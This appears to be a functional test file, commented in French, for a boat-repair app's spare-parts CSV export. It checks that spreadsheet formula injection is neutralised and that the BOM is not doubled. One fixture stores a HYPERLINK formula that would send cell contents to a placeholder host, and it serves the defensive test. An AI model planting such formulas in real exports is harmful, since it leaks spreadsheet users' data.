import { test } from '@japa/runner'
import { truncateDb } from '#tests/utils/db'
import { BoatFactory } from '#database/factories/boat_factory'
import { BoatEngineFactory } from '#database/factories/boat_engine_factory'
import BoatEngineRepairCartItem from '#models/boat_engine_repair_cart_item'
import { createAdminUser } from '#tests/functional/helpers'

/**
 * L'export CSV de la liste de réparation, et son escaper (#773).
 *
 * Ce service avait le sien — `cell => `"${cell.replaceAll('"', '""')}"`` —
 * qui mettait **toujours** la valeur entre guillemets. Ça pouvait passer pour
 * une protection ; ce n'en était pas une : le tableur retire les guillemets à
 * l'import, puis évalue le contenu.
 *
 * Ce spec fige le fait que l'export passe désormais par `buildCsv`, l'escaper
 * partagé. Deux implémentations divergentes de la même règle sont la cause
 * première de l'issue : la corriger deux fois garantissait qu'on la
 * recasserait une fois.
 */

async function makeEligibleEngine(boatId: number) {
  return BoatEngineFactory.merge({
    boatId,
    kind: 'outboard',
    brand: 'Yamaha',
    model: '6E0',
  }).create()
}

test.group('Spare parts cart CSV export (functional)', (group) => {
  group.each.setup(() => truncateDb())

  test('neutralizes a formula stored in a user-entered reference', async ({ client, assert }) => {
    const user = await createAdminUser()
    const boat = await BoatFactory.merge({ organizationId: user.organizationId! }).create()
    const engine = await makeEligibleEngine(boat.id)

    await BoatEngineRepairCartItem.create({
      boatEngineId: engine.id,
      partKey: 'carburetor.repair_kit',
      quantity: 1,
      // `reference` est un champ de saisie libre : c'est le vecteur nommé par
      // l'issue.
      reference: '=HYPERLINK("https://exemple.invalid/?d="&A1,"Facture")',
    })

    const response = await client
      .get(`/boats/${boat.id}/engines/${engine.id}/spare-parts/cart/export`)
      .loginAs(user)

    response.assertStatus(200)
    const body = response.text()

    assert.include(body, `"'=HYPERLINK`, 'la formule doit être désamorcée par une apostrophe')
    assert.notInclude(
      body,
      ';=HYPERLINK',
      'une cellule ne doit jamais commencer par = une fois les guillemets retirés'
    )
  })

  test('keeps the UTF-8 BOM and does not double it', async ({ client, assert }) => {
    // Le BOM était posé par le contrôleur ; il vient maintenant de `buildCsv`,
    // comme pour les quatre autres exports. Le risque de la bascule est de se
    // retrouver avec les deux.
    const user = await createAdminUser()
    const boat = await BoatFactory.merge({ organizationId: user.organizationId! }).create()
    const engine = await makeEligibleEngine(boat.id)

    await BoatEngineRepairCartItem.create({
      boatEngineId: engine.id,
      partKey: 'carburetor.repair_kit',
      quantity: 1,
      reference: 'REF-123',
    })

    const response = await client
      .get(`/boats/${boat.id}/engines/${engine.id}/spare-parts/cart/export`)
      .loginAs(user)

    response.assertStatus(200)
    const body = response.text()

    assert.isTrue(body.startsWith('﻿'))
    assert.isFalse(body.startsWith('﻿﻿'), 'le BOM ne doit pas être posé deux fois')
    assert.include(body, 'REF-123')
  })

  test('a plain quantity stays a plain number', async ({ client, assert }) => {
    // Le témoin fonctionnel : l'export ne doit pas être devenu du texte partout.
    const user = await createAdminUser()
    const boat = await BoatFactory.merge({ organizationId: user.organizationId! }).create()
    const engine = await makeEligibleEngine(boat.id)

    await BoatEngineRepairCartItem.create({
      boatEngineId: engine.id,
      partKey: 'carburetor.repair_kit',
      quantity: 3,
      reference: null,
    })

    const response = await client
      .get(`/boats/${boat.id}/engines/${engine.id}/spare-parts/cart/export`)
      .loginAs(user)

    response.assertStatus(200)
    assert.match(response.text(), /;3(\r\n|$)/)
  })
})
